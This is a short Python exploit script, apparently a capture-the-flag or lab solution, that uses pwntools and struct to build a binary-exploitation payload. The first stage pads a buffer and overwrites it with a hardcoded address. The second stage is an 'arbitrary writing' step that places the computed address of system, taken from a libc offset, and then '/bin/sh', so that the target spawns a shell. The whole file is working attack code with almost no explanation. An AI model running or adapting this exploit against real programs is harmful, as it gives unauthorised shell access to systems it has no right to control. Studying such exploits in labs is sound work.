import sys
import struct
from pwn import *


pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755030)
s1 = pad + read_addr + "\n"

strlen = 0x7ffff7a89190


# step 2 arbitrary writing
system = struct.pack("<Q", strlen-0xfd10)
s2 = system + "\n" + "/bin/sh\n"

sys.stdout.write(s1 + s2)
